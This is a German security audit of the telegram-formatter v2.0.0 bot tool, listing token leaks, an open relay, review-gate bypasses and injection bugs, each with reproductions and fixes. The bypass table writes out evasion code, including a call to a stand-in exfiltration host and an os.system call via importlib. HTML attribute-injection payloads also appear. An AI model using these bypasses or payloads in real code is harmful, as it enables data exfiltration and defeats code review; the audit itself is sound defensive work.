# Security-Audit & Code Review — `telegram-formatter` v2.0.0

> **Status-Hinweis (2026-09-13):** Dies ist der **historische** Audit-Bericht
> zum Stand v2.0.0 (Commit `f955550`) und wird unverändert aufbewahrt. Die
> Behebung der Befunde ist in den Folge-Release-Changelogs (`CHANGELOG.md`)
> dokumentiert; eine komplette Zuordnung „Befund → behobene Version“ steht in
> [`security/README.md`](security/README.md#audit-findings-status-security_auditmd-v200).
> Die beiden letzten Restbefunde (Relay im Selbstbetrieb, Rest-Umgehungen der
> Review-Statik) sind mit **v2.4.0** geschlossen.
>
> **Nachtrag zu K-2 (v2.6.0):** Der Endpunkt `/api/send` ist seit 2.6.0 wieder
> vom Browser erreichbar — aber ausschließlich als *Opt-in des Betreibers* und
> ohne die Relay-Eigenschaft: `TELEGRAM_FORMATTER_SHARED_WEB_SEND=1` (Standard)
> wirkt nur zusammen mit gepinntem `TELEGRAM_CHAT_ID`, ein `chat_id`-Override
> wird weiterhin mit 400 abgewiesen, anonyme Aufrufe brauchen
> `"confirm_public": true` und unterliegen eigenen Längen-/Frequenzgrenzen.
> Das im Audit kritisierte Muster (anonym → beliebiger Zielchat) bleibt
> geschlossen; das verbleibende Restrisiko „fremde Besucher schreiben in den
> eigenen, öffentlichen Chat“ ist dokumentiert und abschaltbar
> ([`security/README.md`](security/README.md#geteilter-bot-im-browser-seit-260)).

| | |
|---|---|
| **Projekt** | https://github.com/Kryschuuu/telegram-formatter |
| **Geprüfter Stand** | Commit `f955550` (Branch `main`, Merge PR #6) |
| **Datum** | 2026-09-11 |
| **Umfang** | Vollständige Codebasis: `telegram_formatter/` (Core, Flask-App, `botkit`-BYOB-Baukasten), `botctl`/`cli`, Templates, Tests (178, alle grün), CI-Workflow, Dependency-Pins, Doku-Claims |
| **Methodik** | Manueller Review aller ~3.300 Zeilen Produktionscode, statische Analyse (Ruff, Bandit — beide clean), OSV-/CVE-Recherche, dynamische Verifikation jedes schwerwiegenden Befunds durch ausführbare Reproduktion im Sandbox-Setup |

**Schweregrad-Legende:** 🔴 Kritisch · 🟠 Hoch · 🟡 Mittel · 🟢 Niedrig

---

## 1. Executive Summary

Das Projekt macht in weiten Teilen einen reifen Eindruck: saubere Schichtarchitektur (I/O-freie Konvertierung vs. Netzwerklayer), durchdachtes Token-Handling (`BotToken`-Umschlag mit Redaction, `compare_digest`, RAM-only-Vaults), Fail-Closed-Defaults im Session-Layer, 178 grüne Tests, gepinnte Dependencies mit `pip-audit`- und Gitleaks-CI. Ruff und Bandit melden **null** Befunde — die gefundenen Probleme liegen tiefer: in Logik, Trust-Modell und Randbedingungen, die kein Linter sieht.

**Die drei wichtigsten Befunde:**

1. **🔴 Token-Leak an HTTP-Clients (kritisch, end-to-end reproduziert):** Schlägt ein Versand fehl (Netzwerk/DNS), landet die Exception-Rohmeldung von `requests` — und damit der **komplette Bot-Token** — im HTTP-Response-Body von `POST /api/send` (`sender.py:51` → `app.py:88`). Auf der öffentlich gehosteten Instanz (Doku: Render.com) genügt ein einziger Error-Aufruf, um den Server-Bot-Token an beliebig Dritte auszuhandigen.
2. **🔴 Unauthentifizierter Open Relay (kritisch, reproduziert):** `POST /api/send` hat keinerlei Authentifizierung und übernimmt `chat_id` ungeprüft aus dem Request-Body (überschreibt den konfigurierten Chat). Jeder Internet-Besucher kann den Bot des Deployers nutzen, um **an beliebige Chats/Kanäle zu senden** — Spam-/Phishing-Vektor, Bot-Sperre, Haftungsrisiko.
3. **🟠 Review-Gate multiple Umgehungen (hoch, 5× reproduziert):** Das Kernversprechen des BYOB-Modells („kein Fremdnetzwerk, keine Persistenz, keine Secrets im Nutzer-Bot-Code") wird von der Statik nur oberflächlich erzwungen. `importlib.import_module("os")` + `os.system`, `tempfile`-Persistenz, `import requests as rq` + **konstante** Fremd-URL → **null Befunde, Gate bestanden**. Damit ist die statische Ebene als Sicherheitskontrolle praktisch wirkungslos; nur die menschliche Review bleibt.

Dazu kommen zwei funktionale Fehler mit direktem Nutzerimpact: **Zeilenumchunking zerreißt HTML-Tags/LaTeX-Blöcke** → Telegram verwirft lange formatierte Nachrichten mit `400 Can't parse entities` (reproduziert), und **`botctl send --local-trust` ist komplett defekt** (dokumentierter Hauptpfad für self-hosted Bots bricht immer mit „Bot ist nicht freigegeben", reproduziert).

**Restrisiko-Einschätzung:** Für den lokalen CLI-Einsatz ist das Projekt solide. Der gehostete Web-Betrieb (die beworbene Render.com-Instanz) ist in der aktuellen Form **nicht vertretbar** (Punkte 1+2). Der BYOB-Review-Prozess braucht Nachschärfung in der Statik und verbindliche CI-Durchsetzung (Punkt 3 + Reject-Bug).

**Ampel nach Kategorien:**

| Kategorie | Bewertung |
|---|---|
| Auth/AuthZ (Web) | 🔴 nicht vorhanden |
| Input-Validierung | 🟡 gemischt (botkit gut, Web-Layer fehlt fast alles) |
| Injection (SQL/XSS/Cmd) | 🟢 kein SQL; 🟡 Telegram-HTML-Attribut-Escape lückenhaft; Client-Preview OK |
| Secrets-Handling | 🟠 Bot-Design gut, Leck über Fehlerpfad kritisch |
| Kryptographie | 🟢 HMAC-Fingerprints, `secrets`, `compare_digest`; 🟢/🟡 prozessfluchtige Schlüssel |
| CORS/CSRF/Header | 🟡 CSRF strukturell gedämpft, aber keine Security-Header, keine SRI |
| Dependencies | 🟡 gepinnt + pip-audit, aber gunicorn 3 Major-Versions zurück |
| Testabdeckung | 🟠 Kern gut abgedeckt, alle sicherheitskritischen Pfade (Auth, Error-Leaks, Gate-Bypasses) ungetestet |

---

## 2. Sicherheitslücken

### 2.1 🔴 Kritisch

---

#### K-1 · Bot-Token leaket bei Netzwerkfehlern in HTTP-Response und Logs
**Dateien:** `telegram_formatter/sender.py:45–54` → `telegram_formatter/app.py:87–88`

**Beschreibung:** `send_message()` verpackt die Original-Exception von `requests` in die Fehlermeldung:

```python
# sender.py:49–51
response = requests.post(f"{base}/{method}", json=message.payload, timeout=timeout)
except requests.RequestException as exc:
    raise SendError(f"Netzwerkfehler beim Versand: {exc}") from exc
```

Die URL enthält den Token (`base = api.telegram.org/bot{token}`), und `str(requests.exceptions.ConnectionError)` inkludiert exakt diese URL („Max retries exceeded with url: **/bot123456789:AAH…**/sendMessage"). `app.py` reicht den String ungefiltert an den Client:

```python
# app.py:87–88
except SendError as exc:
    return jsonify({"error": str(exc)}), 502
```

**Verifikation (reproduziert):**模拟 `requests.post` wirft `ConnectionError` → HTTP-502-Body enthält den Klartext-Token. Triggerbar aus der Ferne bereits durch blockierte ausgehende Verbindungen/DNS-Fehlschlag; zudem landet derselbe String in jedem Log/Traceback, das `SendError` rendert (der `RedactingFilter` der botkit-Privacy-Schicht wird vom Flask-App-Pfad **nie installiert**).

**Auswirkung:** Vollübernahme des zentralen Bots (Nachrichten senden, `getUpdates` lesen → alle Chat-Inhalte des Deployers). Auf der gehosteten Instanz ein kritischer Einzelschaden.

**Lösung:** Fehlermeldung niemals mit `str(exc)` bauen — das Projekt hat das bessere Muster bereits selbst in `botkit/telegram_api.py:47–50` (nur Klassenname). Konsistent übernehmen:

```python
# sender.py
except requests.RequestException as exc:
    raise SendError(f"Netzwerkfehler beim Versand ({exc.__class__.__name__})") from None
...
if response.status_code != 200:
    # Telegram-Description kann Nutzerinhalte enthalten -> kürzen, nie body durchreichen
    detail = (response.json().get("description", "")[:200]
              if response.headers.get("content-type", "").startswith("application/json") else "")
    raise SendError(f"Telegram-API-Fehler {response.status_code}: {detail or 'unbekannt'}")
```

Zusätzlich: `app.py` soll in `SendError`-Fällen nur eine statische Sammelmeldung zurückgeben und Details ausschließlich serverseitig (gefiltert) loggen. **Regressionstest:** Response-Body auf `TOKEN in body` prüfen.

---

#### K-2 · `/api/send` ist ein unauthentifizierter Open Relay mit frei wählbarer `chat_id`
**Datei:** `telegram_formatter/app.py:66–90`

**Beschreibung:** Der Endpunkt akzeptiert anonym `{"text": ..., "chat_id": ...}`. Eine `chat_id` im Body **überschreibt** den per Env konfigurierten Ziel-Chat:

```python
# app.py:77
chat_id = data.get("chat_id") or CHAT_ID
```

Validierung: keine (weder Typ noch Format — `registry.validate_chat_id()` existiert, wird hier aber nicht verwendet). Autorisierung: keine. Rate-Limit: keins.

**Verifikation (reproduziert):** `POST /api/send {"text": "SPAM AN FREMDEN CHAT", "chat_id": "42"}` → HTTP 200 `{"sent": 1}`, Telegram-Aufruf mit `chat_id: 42`. Ebenso wird `chat_id: {"$gt": ""}` (beliebiges JSON) klaglos in den Payload geschrieben.

**Auswirkung:** Jeder Besucher der gehosteten Instanz kann (a) über den fremden Bot beliebige Dritte anschreiben (Spam/Phishing → Telegram sperrt den Bot, Reputationsschaden für den Deployer), (b) unbegrenzte Textmengen zu beliebig vielen Chunks aufteilen und sequentiell wegschicken lassen (DoS auf den eigenen Worker + gegen Telegram-Rate-Limits, bis hin zur Bot-Sperre durch den Betreiber der geteilten Instanz).

**Lösung (mindestens):**

```python
from telegram_formatter.botkit.registry import CHAT_ID_PATTERN

def _valid_chat_id(raw) -> str | None:
    if raw is None:
        return CHAT_ID or None
    if isinstance(raw, (int, str)) and CHAT_ID_PATTERN.match(str(raw).strip()):
        return str(raw).strip()
    return None

@app.route("/api/send", methods=["POST"])
def send():
    if not BOT_TOKEN:
        return jsonify({"error": "nicht konfiguriert"}), 400
    data = request.get_json(silent=True) or {}
    text = data.get("text")
    if not isinstance(text, str) or len(text) > MAX_INPUT_CHARS:
        return jsonify({"error": "text muss ein String <= "
                        f"{MAX_INPUT_CHARS} Zeichen sein"}), 400
    chat_id = _valid_chat_id(data.get("chat_id"))
    if chat_id is None:
        return jsonify({"error": "ungültige chat_id"}), 400
    # Optional härter: user-supplied chat_id komplett verbieten,
    # nur den per Env konfigurierten Zielchat erlauben.
    ...
```

Ergänzend: pro-IP-Rate-Limit (z. B. `flask-limiter`, 5 Sends/min), und die Frage, ob `chat_id`-Override im öffentlichen Betrieb überhaupt sein muss — sicherer ist „nur der konfigurierte Chat".

---

### 2.2 🟠 Hoch

---

#### H-1 · Review-Gate (Statik) an mindestens fünf Stellen vollständig umgehbar
**Datei:** `telegram_formatter/botkit/review.py` (Regelwerk ~Zeilen 60–380)

Das Sicherheitsmodell („Nutzer-Bot-Code darf nicht persistieren, kein Fremdnetzwerk, keine Secrets, keine Shell") hängt an `analyze_code`. Reproduzierte Umgehungen (jeweils `report.ok == True` → Gate passiert):

| # | Code-Muster | Erwartung | Ist-Verhalten |
|---|---|---|---|
| a | `import requests as rq; rq.get("https://evil.example.com/x")` | BK004 Blocker | **kein Befund** — Host-Check greift nur bei wörtlichem `root in {"requests","httpx",...}` (`review.py:~330`), Alias `rq` wird nicht aufgelöst |
| b | `import importlib; os2 = importlib.import_module("os"); os2.system(cmd)` | BK001+BK007 | **kein Befund** — `importlib` nicht verboten, Zielausdruck kein `ast.Name` (`_dotted` liefert "") |
| c | `import tempfile; fh = tempfile.NamedTemporaryFile("w"); fh.write(text)` | BK002 (Persistenz!) | **kein Befund** — `tempfile` nicht in `FORBIDDEN_IMPORTS`, `write` nicht in `PERSISTENCE_CALLS` |
| d | `requests.post(variable_url, ...)` / `requests.post(f"https://{h}/", ...)` | BK004 | nur **BK010 Warning** (`review.py:347–364`) → `ok=True`; Variablen-/f-string-Ziele hebeln den Fremdhost-Block komplett |
| e | `API_TOKEN: str = "123456789:AAH…"` | BK006 | **kein Befund** — `visit_Assign` (Zeile 284) sieht nur `ast.Assign`, nicht `ast.AnnAssign`/Dict-Literale/Call-Keywords |

**Auswirkung:** Ein eingereichter „freigegebener" Bot kann Nutzerinhalte und sogar das Session-Environment an beliebige Server exfiltrieren und lokal persistieren, ohne einen einzigen Blocker zu erzeugen. Das Vier-Augen-Gate delegiert faktisch alles an die menschlichen Reviewer, suggeriert aber technische Durchsetzung (Doku: „Blocker stoppen den Vorgang sofort — es gibt keinen Trotzdem-freigeben-Pfad").

**Lösung (wirksam, nicht perfizistisch):**

```python
# 1) Import-Alias-Auflösung im Visitor:
def visit_Import(self, node):
    for alias in node.names:
        self._aliases[alias.asname or alias.name.split(".")[0]] = alias.name.split(".")[0]
        ...
def visit_ImportFrom(self, node):
    if (node.module or "").split(".")[0] in {"importlib"}:
        self._add("BK001", node, "importlib umgeht das Import-Verbot.")   # komplett verbieten
    ...
# _check_http_target: Alias-Roots über self._aliases mappen, und
# BK010 (URL nicht prüfbar) zum BLOCKER hochstufen, sobald im selben
# Modul sensible Namen (token/chat_id/text/message) in den Aufruf fließen
# oder die URL nicht literal auf api.telegram.org steht.

# 2) FORBIDDEN_IMPORTS ergänzen: {"tempfile", "importlib", "shutil", "os.path"? , "codecs", "io"? }
#    (io/open('w') bleibt via open-Mode-Check); PERSISTENCE_CALLS ergänzen: {"write", "writelines", "mkdir", "replace", "rename"}

# 3) BK006: visit_Constant globally — jede String-Konstante, auf die
#    TOKEN_PATTERN.match(z.strip()) passt, ist Blocker, unabhängig vom Zuweisungstyp.
def visit_Constant(self, node):
    if isinstance(node.value, str) and TOKEN_PATTERN.match(node.value.strip()):
        self._add("BK006", node, "Bot-Token-Literal im Quelltext.")
    self.generic_visit(node)
```

Ehrlicherer Titel in der Doku wäre zusätzlich angebracht: Die Statik ist eine *Heuristik zur Entlastung*, keine Sandboxing-Grenze. Die eigentliche Isolation nutzerseitig ausgeführten Codes kann AST-Analyse prinzipbedingt nicht leisten — falls „gehostete, ausgeführte Bots" je realisiert werden, braucht es OS-/Prozess-Isolation (separate User, no-new-privileges, Read-only-FS, Egress-Proxy nur auf `api.telegram.org`), nicht Review-JSON.

---

#### H-2 · Web-Layer ohne Größen-, Mengen- und Frequenzlimits → DoS auf eigene Infrastruktur
**Dateien:** `app.py` (komplett), `utils.build_messages`

- `app.config["MAX_CONTENT_LENGTH"]` ist **nicht gesetzt** (verifiziert: `None`) → unbegrenzte JSON-Bodygröße; Flask liest den Körper vollständig in den Arbeitsspeicher.
- `botkit.SessionConfig` hat `max_input_chars=100_000` — der App-Pad umgeht `build_messages` ohne jedes Limit. Aus 200 MB Text entstehen ~50.000 Rich-Chunks, die `/api/send` sequentiell (je bis 15 s Timeout) abarbeitet: ein einziger Request legt den Gunicorn-Sync-Worker Minuten bis Stunden lahm; die Doku-Startkommandos (`docs/DEPLOYMENT.md:39`) setzen kein `--timeout`/`--workers`.
- Kein Rate-Limit auf `/api/convert` und `/api/send`; das Frontend feuert zusätzlich bei **jedem Tastendruck** einen Convert-POST (kein Debounce — auch Performance-, s. O-5).

**Verifikation:** `build_messages` auf 4,3 MB Pipe-Text: 2,5 s CPU (nahezu linear, ~0,6 s/MB — kein exponentielles ReDoS, aber linearer CPU-DoS bei unbegrenzter Eingabe); `MAX_CONTENT_LENGTH: None`; Einzel-Worker-Deployment.

**Lösung:**

```python
# app.py
app.config["MAX_CONTENT_LENGTH"] = 512 * 1024          # 512 KiB harte Obergrenze
MAX_INPUT_CHARS = 100_000                              # wie SessionConfig
MAX_CHUNKS = 32                                        # ~1 MiB Rich-Ausgabe
```

Dazu `flask-limiter` (z. B. `10/min/IP` auf `/api/send`, `60/min` auf `/api/convert`), Gunicorn `--workers 2 --timeout 60` in der Doku, und für lange Sendevorgänge ein 413/429-Test.

---

#### H-3 · Upstream-Fehlerdetails (`response.text`) ungefiltert an Clients und in Logs
**Datei:** `telegram_formatter/sender.py:54`

```python
raise SendError(f"Telegram-API-Fehler {response.status_code}: {response.text}")
```

`response.text` ist der vollständige Telegram-Fehlerbody — enthält `description`-Texte, die **Abschnitte des Nachrichteninhalts** spiegeln können (z. B. „can't parse entities: unsupported start tag ... at offset 42" + Kontext) sowie interne Detectors (`parameters.migrate_to_chat_id` → Offenbarung anderer Chat-Shards). Auf der gehosteten Instanz wird das an den Aufruenden von `/api/send` zurückgegeben (geteilt: jeder sieht ggf. Fragmente fremder Sendeversuche, falls die App Instanz übergreifende Fehlerpfade loggt). Der `botkit`-Gegenpart (`telegram_api.py:57–60`) macht es richtig: Description auf 200 Zeichen gekürzt.

**Lösung:** Wie in K-1 skizziert: nur `status_code` + gekürzte, bereinigte Description; niemals `response.text` durchreichen. Zusätzlich `response.json()` in `try/except ValueError` (Sender wirft aktuell unbehandelte `JSONDecodeError` bei 200/Nicht-JSON → 500-Traceback-Pfad).

---

#### H-4 · `RedactingFilter` lässt Tracebacks unredigtiert durch (Geheimnis-Leak über Log)
**Datei:** `telegram_formatter/botkit/privacy.py:140–149`

Der Filter redigiert `record.msg` und `record.exc_text`, aber **nicht** `record.exc_info`. Handler rendern Exception-Stacks erst *nach* `filter()` (`StreamHandler.format` → `formatException`), d. h. jede Exception, deren Meldung eine URL mit Token enthält (typisch: `urllib3`/`requests` bei Debug-Level; `logger.exception()` in Drittbibliotheken), landet ungeschwärzt im Log.

**Verifikation (reproduziert):** `child.exception('boom')` mit `ValueError('... url=https://api.telegram.org/bot<TOKEN>/x')` → `Token im Log-Ausgabestring: True`, obwohl `install_privacy_filters()` aktiv war. (Die reguläre Nachricht wurde korrekt `[redacted]`.)

**Lösung:** Im Filter die Exception vor formatieren und `exc_info` neutralisieren:

```python
def filter(self, record):
    ...
    if record.exc_info:
        record.exc_text = redact(logging.Formatter().formatException(record.exc_info))
        record.exc_info = None
    if record.stack_info:
        record.stack_info = redact(record.stack_info)
    return True
```

---

#### H-5 · Dritte-CDN-Skripte ohne SRI, keine CSP, keine Security-Header
**Datei:** `telegram_formatter/templates/index.html:7–10`

```html
<script src="https://cdn.tailwindcss.com"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/.../font-awesome/6.5.2/...">
```

`cdn.tailwindcss.com` ist (a) nicht versioniert, (b) ohne `integrity`/`crossorigin`, (c) ein JIT-Compiler, der bei jeder Nutzung zur Laufwerk-Compilation DOM und Klassen dynamisch verarbeitet — genau das Skript, das bei Kompromittierung des CDN beliebigen JS-Code in den Seiten der Anwendung pflanzt. Gleiches gilt für die CSS-Datei (Deft-Styles, geringeres Risiko). Es existiert keinerlei CSP, kein `X-Content-Type-Options`, `Referrer-Policy`, `X-Frame-Options` (Clickjacking auf den „Senden"-Button), kein `frame-ancestors`.

**Auswirkung:** CDN-Kompromittierung oder MitM auf Betreiberniveau → JS läuft same-origin und kann `/api/send` beliebig aufrufen (K-2 multipliziert das: kein CSRF-Token nötig), Editorinhalte exfiltrieren.

**Lösung:** Tailwind-Play und FontAwesome **self-hosten** (Build-Step oder statisch ausliefern) oder mindestens SRI-Pins (`integrity="sha384-…"`). Response-Header zentral setzen:

```python
@app.after_request
def sec_headers(resp):
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self'; style-src 'self'; "
        "img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; base-uri 'none'")
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    resp.headers["X-Frame-Options"] = "DENY"
    return resp
```

---

### 2.3 🟡 Mittel

---

#### M-1 · `"` nicht escaped → Attribut-Injection in Telegram-HTML-Payloads
**Datei:** `telegram_formatter/utils.py:380–383` (`_escape_html`), `403–406` (Fenced-`lang`), `445` (Link-URL)

`_escape_html` behandelt nur `& < >`. Zwei Stellen schreiben unescaped in **HTML-Attributkontext**:

1. ```` ```"onmouseover="x ```` → `lang = m.group(1).strip()` wandert ungeprüft in `<pre language="{lang}">`. Reproduziert: `<pre language=""">onclick="alert(1)\nfoo</pre>`.
2. `[t](https://x/"/>onmouseover=1)` → `"` bricht `href="…"` auf. Reproduziert: `<a href="https://ex.com/"onmouseover="alert(1">klick</a>`.

Telegram-HTML-Parser quittiert das meist mit `400` (Nachricht verworfen = DoS auf die eigene Funktion) oder fehlinterpretierten Entities; kein Browser-XSS auf der Projektseite (Payload wird im UI nur via `textContent` angezeigt), aber jede Wiederverwendung der Payloads in anderen Kontexten erbt die Schwäche.

**Lösung:** `lang` auf ein sicheres Alphabet begrenzen, URL-Attribut escopen:

```python
_LANG_RE = re.compile(r"^[A-Za-z0-9_+#.-]{1,64}$")
lang = m.group(1).strip()
if not _LANG_RE.match(lang):
    lang = ""
...
text = re.sub(r'\[([^\]]+)\]\((https?://[^\s)]+)\)',
              lambda m: f'<a href="{_escape_html(m.group(2))}">{m.group(1)}</a>', text)
# und in _escape_html zusätzlich '"' -> "&quot;" (Schritt 4 VOR Attribut-Erzeugung,
# nicht danach, damit Textknoten nicht doppel-escapt werden).
```

---

#### M-2 · `cli.py --token` legt den Bot-Token in Prozessliste und Shell-Historie ab
**Datei:** `telegram_formatter/cli.py:47–52` (Argument), README/DEPLOYMENT (`export TELEGRAM_BOT_TOKEN="…"` direkt in der Shell)

Der Botkit-Kern hat die bessere Antwort bereits implementiert (`BotToken.from_getpass`, `from_environment`, `scrub_environment`) — der zentrale CLI-Einstieg unterläuft sie. `--token 123:ABC…` ist im Klartext in `ps aux` (auch für Unprivilegierte auf Shared-Hosts) und in `~/.bash_history` (welches Tools wie Gitleaks nie sehen).

**Lösung:** `--token` deprecated entfernen/markieren; Statistik: nur `--token-env NAME` (Default `TELEGRAM_BOT_TOKEN`) oder interaktiv via `getpass`. README/DEPLOYMENT: `read -rsp 'Token: ' TELEGRAM_BOT_TOKEN; export TELEGRAM_BOT_TOKEN` bzw. Render-Secret-Panel dokumentieren (steilweise schon OK — `123456:ABC-...`-Beispiel in Tabelle ist harmlos).

---

#### M-3 · `--api-base` akzeptiert `http://` → Token-Klartext übers Netz
**Dateien:** `botctl.py` (register/send: `--api-base`), `sender.py:45`, `telegram_api.py`

`set_webhook` erzwingt HTTPS (gut), aber die API-Basis selbst wird nie geprüft. `botctl send --api-base http://hostile/` (oder Tippfehler/Downgrade-Proxy) schickt Bot-Token + Chat-Inhalt unverschlüsselt. Da `TELEGRAM_API_BASE` in `minimal_bot.py` sogar per Environment gesetzt werden kann, genügt eine Environment-Manipulation (z. B. durch denselben Compromised-Sidecar-Container) für den Totalverlust des Tokens.

**Lösung:** Zentralvalidierung in beiden HTTP-Layern:

```python
def _check_base(base: str) -> str:
    if not base.startswith("https://") and "localhost" not in base and "127.0.0.1" not in base:
        raise SendError("api_base muss HTTPS sein (Ausnahme: localhost).")
    return base
```

---

#### M-4 · Audit-Trail-Trust-Modell: Rollen frei erfindbar, `verify` in CI deaktiviert
**Dateien:** `botkit/review.py` (`Reviewer`, `ReviewLedger.load/save`), `.github/workflows/bot-review.yml` (auskommentierter Verify-Step), `audit/reviews.json` (aktuell `[]`)

- `Reviewer(handle, role)` validiert nur das Handle-Format; „maintainer" ist ein **frei gesetzter String** ohne Bindung an eine echte GitHub-Identität. Ein PR-Autor kann mit `botctl approve … --role maintainer --reviewer <irgendein-name>` (zwei Aufrufe, zwei Pseudonyme) einen vollständigen Vier-Augen-Trail selbst erzeugen und committen.
- Der CI-Workflow erzwingt die *statische* Analyse pro Datei, aber der eigentliche Freigabe-Check `botctl verify` ist **kommentiert** („Optional"). Damit ist „Approved via audit trail" im Merge-Prozess nicht technisch verankert — einzig CODEOWNERS (+1) schützt. CODEOWNERS zeigt auf genau **einen** Account (`@Kryschuuu`) für *alle* Pfade inkl. `audit/` und `review.py` selbst → Einzelabhängigkeitsrisiko (Account-Kompromittierung = Total-Kompromittierung des Gates).
- `save()` schreibt den Trail ohne Sperre: zwei parallele `approve`-Läufe → Lost Update (Trail manipuliert/verliert eine Freigabe; vgl. B-11).

**Lösung:** (a) CI-Verify-Step aktivieren und an die Bot-ID der geänderten Datei binden; (b) `approve`-Kommando an echte Identität koppeln (z. B. `gh api /user`-Login == Handle erzwingen, oder GitHub-Review-Events als Entscheidungsquelle statt CLI-Self-Attestation); (c) zweiten Maintainer in CODEOWNERS; (d) `save()` mit `fcntl.flock` + Read-Modify-Write unter Lock.

---

#### M-5 · Dependency-Stand: gunicorn 3 Major-Versionen zurück, keine Hash-Pins
**Dateien:** `requirements.txt`, `requirements-dev.txt`

| Paket | gepinnt | aktuell (PyPI, verifiziert) | Bewertung |
|---|---|---|---|
| Flask | 3.1.3 | 3.1.3 | ✔ aktuell |
| gunicorn | 23.0.0 | **26.2.0** | ⚠ 23.0.0 behebt die Smuggling-Lücken von ≤22.x (CVE-2024-1135, TE.CL 2025), ist aber 2 Major hinterher — der Changelog seit 24.x enthält u. a. Parser-/Logging-Änderungen mit Sicherheitsrelevanz |
| requests | 2.33.0 | 2.34.2 | ⚠ 1 Minor zurück; 2.33.0 ist >= der Patches für CVE-2024-47081/netrc u. a. |
| pytest | 9.1.1 | 9.1.1 | ✔ (Dev) |

Positiv: alle Versionen hart gepinnt; `pip-audit` läuft im CI **und** wöchentlich (Cron). Fehlend: `--require-hashes`/Lockfile (Supply-Chain bei PyPI-Compromising), urllib3 wird nur transitiv gepinnt.

**Lösung:** `pip-compile --generate-hashes` (oder `uv lock`) einführen, Dependabot/Renovate für die wöchentliche Aktualisierung statt nur Audit, gunicorn-Update auf 26.x mit Changelog-Review (`--timeout`, Standard-Workerzahl dokumentieren), urllib3 explizit in requirements.txt.

---

#### M-6 · CSRF nur strukturell gedämpft; `sendRichMessage`/`html`-Wege ohne Origin-Check
**Datei:** `telegram_formatter/app.py`

Es gibt keinen CSRF-Schutz. Praktisch gedämpft, weil `request.get_json(silent=True)` non-JSON-Formulare ignoriert und `application/json` einen Preflight erfordert (keine CORS-Header → Browser blockieren). Restrisiko: Same-Origin-JS (H-5/XSS) umgeht das vollständig; ältere/fehltolerierende Clients können `Content-Type` tricksen. 

**Lösung:** Doppel-Cookie-Submit oder `SameSite=Lax`-Session-Cookie mit Token-Header-Pflicht (`X-Requested-With`), plus `Origin`-Header-Abgleich bei POSTs (2 Zeilen, sofort umsetzbar):

```python
ALLOWED_ORIGINS = {"https://telegram-formatter.onrender.com"}  # + konfiguriierbar
@app.before_request
def check_origin():
    if request.method != "GET":
        o = request.headers.get("Origin")
        if o and urllib.parse.urlparse(o).netloc != request.host:
            return jsonify({"error": "origin mismatch"}), 403
```

---

#### M-7 · Kein Thread-Safety in `SessionManager`/`InMemoryTokenVault`, Reap nur bei `open()`
**Dateien:** `botkit/session.py:296–408`, `botkit/tokens.py:222–270`

Dict-Mutationen (`_entries`, `_sessions`) ohne Locks: unter Gunicorn-Threads (`--threads >1`) sind `fetch()`-check-then-delete und `reap_expired()`-über-live-dict (`RuntimeError: dictionary changed size during iteration`, wenn parallel `open()` entfernt) realistiche Race-Pfade — mit potenzieller Doppelverwendung/Geisterfreigabe abgelaufener Tokens. Zudem: Ablaufende Sessions werden **nur** beim nächsten `open()` abgeräumt — in einer ruhenden gehosteten Instanz bleiben Token-Referenzen unbegrenzt über die TTL im RAM (verifiziert: Einträge persistieren bis zum nächsten Open).

**Lösung:** `threading.Lock` um `store/fetch/revoke/purge_expired` und `open/get/close/reap_expired` (Contend ist minimal); Reaper als `threading.Timer`/APScheduler-Job oder reap in `get()`.

---

### 2.4 🟢 Niedrig

- **N-1 · NUL-Platzhalter-Kollision** (`utils.py:370, 374–377`): `_PlaceholderStore` nutzt `\x00{i}\x00` im *Nutzer*-text; `normalize_text` entfernt kein `\x00` (JSON `\u0000` ist erlaubt). Eingaben mit `\x000\x00` können Store-Inhalte vertauschen/in den Payload schleusen; überzählige `\x00`-Token führen zu Telegram-`400` (NUL). Fix: `text = text.replace("\x00", "")` in `normalize_text`.
- **N-2 · Gitleaks-Allowlist ohne Pfadbindung** (`.gitleaks.toml`): Das Regex `123456789:[A-Za-z0-9_-]{35}` allowlistet tokenförmige Werte **repo-weit** (Allowlist-Eigenschaften greifen bei gitleaks OR-verknüpft). Ein echtes Token mit zufälliger ID 123456789 würde übersehen. Fix: `paths`-Einschränkung auf `tests/fixtures/` (regex dann als zweite Bedingung mit `regexTarget`).
- **N-3 · Dev-Server-Defaults:** `app.run(host="0.0.0.0")` ist dokumentiert (`nosec`), aber mit `FLASK_DEBUG=1` in einem Container wäre der Werkzeug-Debugger (PIN-aber brute-forcbarer RCE-Vektor) netzwerkseitig offen. Fix: Debug hart ausschließen (`app.run(..., debug=False)`; `if os.environ.get("FLASK_DEBUG"): abort`) oder `WERKZEUG_RUN_MAIN`-Gates.
- **N-4 · Registry-TTL nutzt Wanduhr** (`registry.py: clock=time.time`): Clock-Jumps (NTP, VM-Suspend) können Registrierungen vorzeitig ablaufen lassen oder verlängern; Sessions nutzen `monotonic` — die beiden TTLs sind nicht konsistent. unkritisch, aber Dokumentationshinweis/Umstellung auf monotonic (mit Warnung vor Wallclock-Vergleichen über Prozesse) empfohlen.
- **N-5 · Doku-vs-Code:** `tokens.py:214–218` bewirbt „HttpOnly-Cookie-Handle"-Hosting-Flow und `InMemoryTokenVault` — implementiert ist dieser Flow nirgends (die Flask-App nutzt keinen Vault). Entweder implementieren (dann gehört der Cookie-Layer auditiert) oder Doku auf „bereitgestellte Bausteine" kühlen.

---

## 3. Bugs

### B-1 🟠 Zeilen-/Wort-Chunken reißt HTML-Tags, Entities, `$$`-Blöcke und Codefences entzwei → Telegram-400
**Dateien:** `utils.py:638–675` (`build_messages`), `677–710` (`_group`/`_split_oversized_paragraph`), `712–748` (`chunk_text`)

Ablauf: `markdown_to_html()` erzeugt **eine** HTML-Zeile (`<b>…</b>`), *danach* chunked `chunk_text` starr auf 4096. Jedes Formatierungsmerkmal, das die Chunk-Grenze kreuzt, erzeugt zwei syntaktisch defekte Payloads — Telegram lehnt **beide** ab.

**Verifikation (reproduziert):**
- `**lang…lang**` (5.000 Zeichen): chunk0 = `<b>=1, </b>=0`, chunk1 = umgekehrt → `400 Can't parse entities` für jede Teilmeldung; die Nachricht kommt **nie** an.
- Display-Math `$$\n…\n$$` über 32.768: `$$`-Anzahl pro Chunk ungerade (offene Formel über Chunkgrenze) → kaputtes Rendering.
- Analog: ``` -Fences und `&amp;`-Entities, die hart gesplittet werden.

